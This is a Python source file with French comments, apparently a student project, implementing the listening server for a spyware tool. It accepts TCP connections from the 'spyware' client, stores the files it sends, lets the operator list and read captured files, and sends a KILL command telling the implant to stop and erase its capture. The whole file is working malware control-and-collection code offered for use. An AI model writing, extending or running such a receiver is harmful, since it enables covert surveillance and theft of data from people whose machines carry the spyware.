import argparse
import socket
import threading
import time
import queue
import os

# Paramètres du serveur
host = 'localhost'

# Créez un analseur d'argument et qui d<ésactive le help par défaut
parser = argparse.ArgumentParser(add_help=False)

# Ajouter la commande help -h/--help
parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='Méssage d\'aide qui affiche les commandes disponibles')

# Ajoutez l'option -l/--listen
parser.add_argument('-l', '--listen', type=int, default=9809,  help='Se met en écoute sur le port TCP saisi par l\'utilisateur et attend les données du spyware')

# Ajoutez l'option -s/--show
parser.add_argument('-s', '--show', action='store_true', help='Affiche la liste des fichiers réceptionnés')

# Ajoutez l'option -r/--readfile
parser.add_argument('-r', '--readfile', nargs='*', type=str, help=' Affiche le contenu du fichier demandé.')

# Ajoutez l'option -k/--kill
parser.add_argument('-k','--kill',action='store_true', help='arrête toute les instances de serveurs en cours, avertit le spyware de s\'arrêter et de supprimer la capture.')



# Analysez les arguments de la ligne de commande
args = parser.parse_args()

# Utilisez args.port comme le port sur lequel le serveur doit écouter
port = args.listen



def show_files():
    files = os.listdir('.')
    print("Fichiers réceptionnés :")
    for file in files:
        print(file)

def read_file(filename):
    try:
        with open(filename, 'r') as file:
            print(file.read())
    except FileNotFoundError:
        print(f"Le fichier {filename} n'existe pas.")






def read_commands():
    while True:
        command = input("Serveur > ")
        if not command:  # Si la commande est vide 
            continue  

        try:
            # Parsez la commande avec argparse
            args = parser.parse_args(command.split())

            if '-l' in command or '--listen' in command:
                global port
                port = args.listen
                print(f"Le serveur écoute maintenant sur le port {port}")


            elif args.show:  # Si l'utilisateur a entré la commande -s ou --show
                show_files()  # Affichez la liste des fichiers


            elif args.readfile:  # Si l'utilisateur a entré la commande -r ou --readfile
                filename = ' '.join(args.readfile)
                read_file(filename)  # Affichez le contenu du fichier spécifié
            
            elif args.kill:  # Si l'utilisateur a entré la commande -k ou --kill
                try:
                    client_socket.sendall('KILL'.encode())
                    server_socket.close()
                    print('Signal bien envoyé au Spyware')
                except:
                    print('Il ni a pas de client connecté')
                    continue



        except SystemExit:
            pass

# Démarrer un thread pour lire les commandes de l'utilisateur
command_thread = threading.Thread(target=read_commands)
command_thread.daemon = True  
command_thread.start()



# Création d'une socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))

# Attente de connexions
server_socket.listen(1)
print(f"Le serveur écoute sur {host}:{port}")

def write_to_file(filename, data_queue):
    while True:
        with open(filename, 'ab') as file:
            while not data_queue.empty():
                file_data = data_queue.get()
                file.write(file_data)
        time.sleep(10)

# Liste pour suivre les connexions établies
connected_clients = []

while True:
    # Accepter la connexion du client
    client_socket, client_address = server_socket.accept()
    
    # Ajouter le client à la liste des clients connectés
    connected_clients.append(client_address)
    
    # Imprimer la connexion établie une seule fois
    if len(connected_clients) == 1:
        print(f"Connexion établie avec {client_address}")
    
    # Recevoir la taille du nom du fichier
    filename_size = int.from_bytes(client_socket.recv(4), 'big')

    # Recevoir le nom du fichier
    filename = client_socket.recv(filename_size).decode()

    # Créer une queue pour stocker les données reçues
    data_queue = queue.Queue()

    # Démarrer un thread pour écrire les données dans le fichier
    threading.Thread(target=write_to_file, args=(filename, data_queue)).start()

    # Recevoir le contenu du fichier à la queue
    while True:
        file_data = client_socket.recv(1024)
        if not file_data:
            break
        data_queue.put(file_data)
